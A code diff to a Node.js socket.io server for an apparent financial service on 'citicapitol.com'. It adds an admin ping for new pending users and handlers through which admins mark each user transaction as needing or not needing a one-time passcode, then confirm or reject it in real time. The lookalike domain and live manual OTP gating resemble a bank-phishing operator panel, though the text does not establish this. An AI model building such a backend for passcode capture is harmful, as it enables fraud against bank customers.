@@ -19,7 +19,8 @@ const server = http.createServer(app);
 const io = new Server(server, {
     cors: {
         origin: [
-            "https://your-frontend-domain.com",
+            "https://city-capital-socket.onrender.com",
+            "https://citicapitol.com",
             "http://localhost:3000"
         ],
         methods: ["GET", "POST"],
@@ -72,6 +73,22 @@ app.post("/emit", (req, res) => {
 
     return res.json({ ok: true });
 });
+/* ============================================================================
+   HTTP ENDPOINT FOR PINGING ADMINS ABOUT NEW USER
+============================================================================ */
+app.post("/ping_pending_user", (req, res) => {
+    const token = req.header("x-api-key") || "";
+    if (token !== SECRET) {
+        return res.status(401).json({ ok: false, message: "Unauthorized" });
+    }
+
+    console.log("Admin ping: new pending user created");
+
+    // Just emit a ping to all admins
+    io.to("admins").emit("new_pending_user");
+
+    return res.json({ ok: true });
+});
 
 /* ============================================================================
    SOCKET CONNECTION EVENTS
@@ -116,6 +133,28 @@ io.on("connection", (socket) => {
             socket_id: socket.id
         });
     });
+     
+    // Server-side: handle admin OTP-not-needed confirmation
+     socket.on("admin_confirm_otp_notneeded", (data) => {
+         console.log("Admin confirmed OTP not needed:", data);
+     
+         // Save in pending confirmations for sync if user joins later
+         pendingConfirmations[data.transaction_id] = {
+             ...data,
+             status: "otpNotNeeded"
+         };
+     
+         // User room
+         const roomName = `txn-${data.transaction_id}`;
+     
+         // Emit to that specific user
+         io.to(roomName).emit("otp_not_needed", {
+             ...data,
+             status: "otpNotNeeded"
+         });
+     
+         console.log(`Broadcasted otp_not_needed to ${roomName}`);
+     });
 
     /* ------------------------ ADMIN CONFIRMS TRANSACTION ------------------------ */
     socket.on("admin_confirm_txn", (data) => {
@@ -127,7 +166,10 @@ io.on("connection", (socket) => {
          };
 
         const roomName = `txn-${data.transaction_id}`;
-        io.to(roomName).emit("txn_confirmed", data);
+        io.to(roomName).emit("txn_confirmed", {
+        ...data,
+        status: "confirmed"
+    });
         console.log(`Broadcasted txn_confirmed to ${roomName}`);
     });
 
@@ -140,22 +182,27 @@ io.on("connection", (socket) => {
         };
 
         const roomName = `txn-${data.transaction_id}`;
-        io.to(roomName).emit("txn_rejected", data);
+        io.to(roomName).emit("txn_rejected", {
+        ...data,
+        status: "rejected"
+    });
         console.log(`Broadcasted txn_rejected to ${roomName}`);
     });
 // Server-side: handle admin OTP-needed confirmation
 socket.on("admin_confirm_otp_needed", (data) => {
-    console.log("Admin marked OTP needed for transaction:", data);
+    console.log("Admin marked OTP needed:", data);
 
     pendingConfirmations[data.transaction_id] = {
-            ...data,
-            status: "otpNeeded"
-        };
-    const roomName = `txn-${data.transaction_id}`;
-    // Optionally, notify the user in that transaction room
-    io.to(roomName).emit("otp_needed", data);
+        ...data,
+        status: "otpNeeded"
+    };
 
-    // You can also save this info to DB if needed
+    const roomName = `txn-${data.transaction_id}`;
+
+    io.to(roomName).emit("otp_needed", {
+        ...data,
+        status: "otpNeeded"
+    });
 });
 
     /* ------------------------------ DISCONNECT ------------------------------ */
